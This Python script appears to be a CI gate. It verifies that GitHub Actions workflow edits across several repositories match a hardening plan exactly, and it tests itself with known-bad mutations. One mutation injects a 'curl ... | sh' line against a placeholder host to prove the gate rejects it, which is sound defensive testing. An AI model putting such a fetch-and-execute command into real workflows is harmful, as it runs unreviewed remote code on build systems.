#!/usr/bin/env python3
"""ci-hardening gate: proves a workflow diff is EXACTLY the planned edits.

Usage:
  ci-hardening-gate.py workflows <repo-name> <worktree> <base-ref>
  ci-hardening-gate.py release-gen <engrave-worktree> <repo-name>=<worktree>...
  ci-hardening-gate.py self-test <toolkit-repo> <base-ref>

`workflows`: builds the EXPECTED parsed YAML of every workflow by applying the
planned edits to the base (PLAN_ci_hardening_2026-10-11.md):
  T  job-level `timeout-minutes: 60` on every job with `runs-on`
  X  step-level `timeout-minutes: 15` on every step whose name starts
     "Install pandoc + texlive" (mnemonic-toolkit)
  C  the exact top-level CONCURRENCY block on every workflow with a
     pull_request trigger and no base top-level `concurrency`
  K  (mnemonic-toolkit) the exact K steps at their exact positions, and the
     exact CARGO_INSTALL_ROOT env on exactly the nine named install steps
and asserts new == expected for every file, and that the file set is
unchanged. It also reads `git diff` and asserts no line was REMOVED, except
the one K4 comment line in technical-manual.yml, so existing comments and
lines cannot be altered or deleted.
`release-gen`: runs the edited generator in mnemonic-engrave
(scripts/release-workflows/{gen,emit}.py) with output kept in memory, and
asserts each result is byte-identical to that repo's edited release.yml.
`self-test`: applies the plan to a scratch copy of each base, asserts GREEN,
then applies each known-bad mutation and asserts RED.

NOT COVERED: the text of ADDED comments and blank lines, and quoting style
(YAML parsing drops them; the reviewer reads the diff). It does not run the
workflows; CI on the PR does that.
"""
import copy
import os
import pathlib
import re
import subprocess
import sys
import tempfile

import yaml

CONCURRENCY = {
    "group": "${{ github.workflow }}-${{ github.event_name == 'pull_request' && github.event.pull_request.number || github.run_id }}",
    "cancel-in-progress": True,
}
INSTALL_ROOT_ENV = {"CARGO_INSTALL_ROOT": "${{ runner.temp }}/sibling-clis"}
K1_FILES = {"manual.yml": "manual", "quickstart.yml": "quickstart",
            "technical-manual.yml": "technical-manual"}
K2_STEPS = ("Install mk-cli", "Install md-cli", "Install ms-cli")
K4_OLD = "        # MD/MS/MK resolve via $PATH to the cargo-installed ~/.cargo/bin"
TEXLIVE = "Install pandoc + texlive"
IMG_STEP = {"name": "Read runner image for the cache key", "id": "img",
            "run": 'echo "image=$ImageOS" >> "$GITHUB_OUTPUT"'}


def k1_steps(fname):
    return [
        {"name": "Put cached sibling CLIs on PATH", "id": "sibling",
         "if": "steps.guard.outputs.relevant == 'true'",
         "run": 'echo "$RUNNER_TEMP/sibling-clis/bin" >> "$GITHUB_PATH"\n'
                'echo "image=$ImageOS" >> "$GITHUB_OUTPUT"\n'},
        {"name": "Restore cached sibling CLIs",
         "if": "steps.guard.outputs.relevant == 'true' && !startsWith(github.ref, 'refs/tags/')",
         "uses": "actions/cache@v4",
         "with": {"path": "${{ runner.temp }}/sibling-clis",
                  "key": "sibling-clis-${{ steps.sibling.outputs.image }}-${{ github.job }}-"
                         f"${{{{ hashFiles('.github/workflows/{fname}', 'rust-toolchain.toml') }}}}"}},
    ]


K3 = {  # job -> (anchor step name, steps to insert above it)
    "verify-examples": ("Install GUI-pinned CLI tier (md / ms / mk) into an isolated root", [
        dict(IMG_STEP),
        {"name": "Restore cached GUI-pinned CLI tier",
         "if": "${{ !startsWith(github.ref, 'refs/tags/') }}",
         "uses": "actions/cache@v4",
         "with": {"path": "${{ runner.temp }}/docbins",
                  "key": "docbins-${{ steps.img.outputs.image }}-${{ hashFiles('.github/workflows/manual-gui.yml', 'rust-toolchain.toml') }}"}},
    ]),
    "verify-examples-gui": ("Install pinned gui-render (headless, --no-default-features)", [
        dict(IMG_STEP),
        {"name": "Restore cached GUI-pinned gui-render",
         "if": "${{ !startsWith(github.ref, 'refs/tags/') }}",
         "uses": "actions/cache@v4",
         "with": {"path": "${{ runner.temp }}/guibin",
                  "key": "guibin-${{ steps.img.outputs.image }}-${{ hashFiles('.github/workflows/manual-gui.yml', 'docs/manual-gui/pinned-upstream.toml') }}"}},
    ]),
}


class GateError(Exception):
    pass


def load(text):
    y = yaml.safe_load(text)
    if True in y:  # PyYAML parses the bare key `on` as boolean True
        y["on"] = y.pop(True)
    return y


def triggers(on):
    if isinstance(on, (dict, list)):
        return set(on)
    return {on}


def insert_before(steps, anchor, new_steps, where):
    idx = [i for i, s in enumerate(steps) if s.get("name") == anchor]
    if len(idx) != 1:
        raise GateError(f"{where}: anchor step {anchor!r} found {len(idx)} times in base")
    steps[idx[0]:idx[0]] = copy.deepcopy(new_steps)


def expected(repo, fname, old):
    e = copy.deepcopy(old)
    counts = dict(T=0, X=0, C=0, K_steps=0, K_env=0)
    if "pull_request" in triggers(e.get("on")) and "concurrency" not in e:
        e["concurrency"] = copy.deepcopy(CONCURRENCY)
        counts["C"] += 1
    for jn, job in (e.get("jobs") or {}).items():
        if "runs-on" in job:
            if "timeout-minutes" in job:
                raise GateError(f"{fname}: job {jn} already has timeout-minutes in base (plan: STOP)")
            job["timeout-minutes"] = 60
            counts["T"] += 1
        for st in job.get("steps") or []:
            if st.get("name", "").startswith(TEXLIVE):
                st["timeout-minutes"] = 15
                counts["X"] += 1
    if repo == "mnemonic-toolkit":
        if fname in K1_FILES:
            job = e["jobs"][K1_FILES[fname]]
            for st in job["steps"]:
                if st.get("name") in K2_STEPS:
                    if "env" in st:
                        raise GateError(f"{fname}: step {st['name']!r} already has env in base (plan: STOP)")
                    st["env"] = dict(INSTALL_ROOT_ENV)
                    counts["K_env"] += 1
            insert_before(job["steps"], "Install mk-cli", k1_steps(fname), fname)
            counts["K_steps"] += 2
        if fname == "manual-gui.yml":
            for jn, (anchor, new_steps) in K3.items():
                insert_before(e["jobs"][jn]["steps"], anchor, new_steps, f"{fname}:{jn}")
                counts["K_steps"] += len(new_steps)
    return e, counts


EXPECTED_COUNTS = {
    "descriptor-mnemonic": dict(T=16, X=0, C=4, K_steps=0, K_env=0),
    "mnemonic-toolkit": dict(T=42, X=6, C=12, K_steps=10, K_env=9),
    "mnemonic-gui": dict(T=8, X=0, C=2, K_steps=0, K_env=0),
    "mnemonic-key": dict(T=13, X=0, C=3, K_steps=0, K_env=0),
    "mnemonic-secret": dict(T=20, X=0, C=3, K_steps=0, K_env=0),
    "mnemonic-engrave": dict(T=5, X=0, C=1, K_steps=0, K_env=0),
    "mnemonic-transaction": dict(T=4, X=0, C=1, K_steps=0, K_env=0),
}


def same(a, b):
    """Equality that also requires equal types, so `1` never equals `True`."""
    if type(a) is not type(b):
        return False
    if isinstance(a, dict):
        return a.keys() == b.keys() and all(same(a[k], b[k]) for k in a)
    if isinstance(a, list):
        return len(a) == len(b) and all(same(x, y) for x, y in zip(a, b))
    return a == b


def git(*args):
    return subprocess.run(["git", *args], capture_output=True, text=True, check=True).stdout


def check_workflows(repo, tree, base):
    tree = pathlib.Path(tree)
    errs = []
    names = sorted(git("-C", str(tree), "ls-tree", "--name-only", f"{base}:.github/workflows/").split())
    cur = sorted(p.name for p in (tree / ".github/workflows").iterdir())
    if names != cur:
        errs.append(f"workflow file set changed: base={names} now={cur}")
    total = dict(T=0, X=0, C=0, K_steps=0, K_env=0)
    for f in names:
        if not f.endswith((".yml", ".yaml")):
            continue
        old = load(git("-C", str(tree), "show", f"{base}:.github/workflows/{f}"))
        try:
            exp, counts = expected(repo, f, old)
        except GateError as ex:
            errs.append(str(ex))
            continue
        for k in total:
            total[k] += counts[k]
        new = load((tree / ".github/workflows" / f).read_text())
        if not same(new, exp):
            errs.append(f"{f}: parsed YAML differs from base + planned edits")
    if total != EXPECTED_COUNTS[repo]:
        errs.append(f"counts {total} != plan table {EXPECTED_COUNTS[repo]}")
    removed = [l[1:] for l in git("-C", str(tree), "diff", "-U0", base, "--", ".github/workflows").splitlines()
               if l.startswith("-") and not l.startswith("---")]
    allowed = [K4_OLD] if repo == "mnemonic-toolkit" else []
    if removed != allowed:
        errs.append(f"removed lines {removed!r}, allowed only {allowed!r}")
    print(f"{repo}: files={len(names)} " + " ".join(f"{k}={v}" for k, v in total.items()))
    for e in errs:
        print("FAIL:", e)
    print("GATE: " + ("RED" if errs else "GREEN"))
    return not errs


def check_release_gen(engrave_tree, pairs):
    rw = pathlib.Path(engrave_tree) / "scripts/release-workflows"
    src = (rw / "emit.py").read_text()
    marker = "\nfor repo, kw in REPOS.items():\n"
    if src.count(marker) != 1:
        print("FAIL: emit.py write loop not found exactly once")
        print("GATE: RED")
        return False
    ns = {}
    sys.path.insert(0, str(rw))
    cwd = os.getcwd()
    os.chdir(rw)
    try:
        exec(compile(src.split(marker)[0], str(rw / "emit.py"), "exec"), ns)
    finally:
        os.chdir(cwd)
    gen = ns["gen"]
    ok = True
    want = set(ns["REPOS"])
    got = {p.split("=", 1)[0] for p in pairs}
    if want != got:
        print(f"FAIL: generator repos {sorted(want)} != given {sorted(got)}")
        print("GATE: RED")
        return False
    for pair in pairs:
        repo, tree = pair.split("=", 1)
        kw = ns["REPOS"][repo]
        b = kw["bin_"]
        text = gen(why_subset=ns["WHY"][b], smoke=ns["SMOKE"].get(b, ns["MD_SMOKE"]),
                   test_setup=ns["TEST_SETUP"].get(b, ""), test_os=ns["TEST_OS"].get(b, "[ubuntu-latest]"), **kw)
        have = (pathlib.Path(tree) / ".github/workflows/release.yml").read_text()
        same = text == have
        ok &= same
        print(f"release-gen {repo}: {'identical' if same else 'DIFFERS'}")
    print("GATE: " + ("GREEN" if ok else "RED"))
    return ok


# ---- self-test: the gate must go GREEN on the plan and RED on each mutation ----

def apply_plan_text(repo, wf_dir):
    """Literal text edits as the plan describes them (independent of expected())."""
    blk = ("# Cancel a pull request's superseded run when a newer commit is pushed to it.\n"
           "# Every other event gets a group of its own (the run id), so pushes, tags,\n"
           "# schedules and dispatches are never cancelled.\n"
           "concurrency:\n"
           "  group: ${{ github.workflow }}-${{ github.event_name == 'pull_request' && github.event.pull_request.number || github.run_id }}\n"
           "  cancel-in-progress: true\n\n")
    for p in sorted(wf_dir.glob("*.yml")):
        t = p.read_text()
        y = load(t)
        t = re.sub(r"^(    runs-on:.*\n)", r"\1    timeout-minutes: 60\n", t, flags=re.M)
        t = re.sub(r"^(      - name: Install pandoc \+ texlive.*\n)", r"\1        timeout-minutes: 15\n", t, flags=re.M)
        if "pull_request" in triggers(y.get("on")) and "concurrency" not in y:
            t = t.replace("\njobs:\n", "\n" + blk + "jobs:\n", 1)
        if repo == "mnemonic-toolkit" and p.name in K1_FILES:
            k1 = ("      - name: Put cached sibling CLIs on PATH\n"
                  "        id: sibling\n"
                  "        if: steps.guard.outputs.relevant == 'true'\n"
                  "        run: |\n"
                  '          echo "$RUNNER_TEMP/sibling-clis/bin" >> "$GITHUB_PATH"\n'
                  '          echo "image=$ImageOS" >> "$GITHUB_OUTPUT"\n\n'
                  "      - name: Restore cached sibling CLIs\n"
                  "        if: steps.guard.outputs.relevant == 'true' && !startsWith(github.ref, 'refs/tags/')\n"
                  "        uses: actions/cache@v4\n"
                  "        with:\n"
                  "          path: ${{ runner.temp }}/sibling-clis\n"
                  f"          key: sibling-clis-${{{{ steps.sibling.outputs.image }}}}-${{{{ github.job }}}}-${{{{ hashFiles('.github/workflows/{p.name}', 'rust-toolchain.toml') }}}}\n\n")
            t = t.replace("      - name: Install mk-cli\n", k1 + "      - name: Install mk-cli\n", 1)
            t = re.sub(r"(      - name: Install m[kds]-cli\n(?:        (?!run:).*\n)*)(        run: )",
                       r"\1        env:\n          CARGO_INSTALL_ROOT: ${{ runner.temp }}/sibling-clis\n\2", t)
            t = t.replace(K4_OLD + "\n", "        # MD/MS/MK resolve via $PATH to the cargo-installed $RUNNER_TEMP/sibling-clis/bin\n")
        if repo == "mnemonic-toolkit" and p.name == "manual-gui.yml":
            img = ("      - name: Read runner image for the cache key\n"
                   "        id: img\n"
                   '        run: echo "image=$ImageOS" >> "$GITHUB_OUTPUT"\n\n')
            docbins = (img +
                       "      - name: Restore cached GUI-pinned CLI tier\n"
                       "        if: ${{ !startsWith(github.ref, 'refs/tags/') }}\n"
                       "        uses: actions/cache@v4\n"
                       "        with:\n"
                       "          path: ${{ runner.temp }}/docbins\n"
                       "          key: docbins-${{ steps.img.outputs.image }}-${{ hashFiles('.github/workflows/manual-gui.yml', 'rust-toolchain.toml') }}\n\n")
            guibin = (img +
                      "      - name: Restore cached GUI-pinned gui-render\n"
                      "        if: ${{ !startsWith(github.ref, 'refs/tags/') }}\n"
                      "        uses: actions/cache@v4\n"
                      "        with:\n"
                      "          path: ${{ runner.temp }}/guibin\n"
                      "          key: guibin-${{ steps.img.outputs.image }}-${{ hashFiles('.github/workflows/manual-gui.yml', 'docs/manual-gui/pinned-upstream.toml') }}\n\n")
            for anchor, txt in ((K3["verify-examples"][0], docbins), (K3["verify-examples-gui"][0], guibin)):
                t = t.replace(f"      - name: {anchor}\n", txt + f"      - name: {anchor}\n", 1)
        p.write_text(t)


MUTATIONS = {
    "drop one K2 env": ("quickstart.yml", lambda t: t.replace("        env:\n          CARGO_INSTALL_ROOT: ${{ runner.temp }}/sibling-clis\n", "", 1)),
    "drop PATH step": ("manual.yml", lambda t: re.sub(r"      - name: Put cached sibling CLIs on PATH\n(?:        .*\n|          .*\n)+\n", "", t, count=1)),
    "replace PATH run": ("manual.yml", lambda t: t.replace('echo "$RUNNER_TEMP/sibling-clis/bin" >> "$GITHUB_PATH"', "curl -s https://example.invalid | sh", 1)),
    "K step in rust.yml": ("rust.yml", lambda t: t.replace("    steps:\n", "    steps:\n      - name: Restore cached sibling CLIs\n        run: 'true'\n", 1)),
    "K env in cross-tool": ("cross-tool-differential.yml", lambda t: t.replace("        run: cargo install --git", "        env:\n          CARGO_INSTALL_ROOT: ${{ runner.temp }}/sibling-clis\n        run: cargo install --git", 1)),
    "wrong cache path": ("manual-gui.yml", lambda t: t.replace("path: ${{ runner.temp }}/docbins", "path: ~/.cargo", 1)),
    "timeout 61": ("rust.yml", lambda t: t.replace("timeout-minutes: 60", "timeout-minutes: 61", 1)),
    "stray trigger": ("rust.yml", lambda t: t.replace("  pull_request:\n", "  pull_request:\n  schedule: [{cron: '0 0 * * *'}]\n", 1)),
    "drop a comment line": ("rust.yml", lambda t: t.replace("# Security note: this workflow uses only GitHub-provided trusted context\n", "", 1)),
    "cancel 1 not true": ("manual.yml", lambda t: t.replace("cancel-in-progress: true", "cancel-in-progress: 1", 1)),
}


def move_restore_below(t):
    m = re.search(r"      - name: Restore cached sibling CLIs\n(?:        .*\n|          .*\n)+\n", t)
    t = t[:m.start()] + t[m.end():]
    return t.replace("      - name: Build mnemonic binary (debug)\n", m.group(0) + "      - name: Build mnemonic binary (debug)\n", 1)


MUTATIONS["restore moved below installs"] = ("manual.yml", move_restore_below)


def self_test(toolkit_repo, base):
    ok = True
    with tempfile.TemporaryDirectory(dir=os.environ.get("GATE_SCRATCH")) as d:
        d = pathlib.Path(d)
        subprocess.run(["git", "init", "-q", str(d)], check=True)
        out = subprocess.run(["git", "-C", toolkit_repo, "archive", base, ".github"],
                             capture_output=True, check=True).stdout
        subprocess.run(["tar", "-x", "-C", str(d)], input=out, check=True)
        subprocess.run(["git", "-C", str(d), "add", "-A"], check=True)
        subprocess.run(["git", "-C", str(d), "-c", "user.email=g@t", "-c", "user.name=gate", "commit", "-qm", "base"], check=True)
        wf = d / ".github/workflows"
        apply_plan_text("mnemonic-toolkit", wf)
        green = {p.name: p.read_text() for p in wf.glob("*.yml")}
        print("== self-test: plan applied (want GREEN)")
        ok &= check_workflows("mnemonic-toolkit", d, "HEAD")
        for name, (f, mut) in MUTATIONS.items():
            for p in wf.glob("*.yml"):
                p.write_text(green[p.name])
            before = (wf / f).read_text()
            after = mut(before)
            if after == before:
                print(f"SELF-TEST BROKEN: mutation {name!r} changed nothing")
                ok = False
                continue
            (wf / f).write_text(after)
            print(f"== self-test mutation: {name} (want RED)")
            if check_workflows("mnemonic-toolkit", d, "HEAD"):
                print(f"SELF-TEST FAIL: mutation {name!r} passed the gate")
                ok = False
    print("SELF-TEST: " + ("PASS" if ok else "FAIL"))
    return ok


if __name__ == "__main__":
    a = sys.argv[1:]
    if a[:1] == ["workflows"] and len(a) == 4:
        sys.exit(0 if check_workflows(a[1], a[2], a[3]) else 1)
    if a[:1] == ["release-gen"] and len(a) >= 3:
        sys.exit(0 if check_release_gen(a[1], a[2:]) else 1)
    if a[:1] == ["self-test"] and len(a) == 3:
        sys.exit(0 if self_test(a[1], a[2]) else 1)
    print(__doc__)
    sys.exit(2)
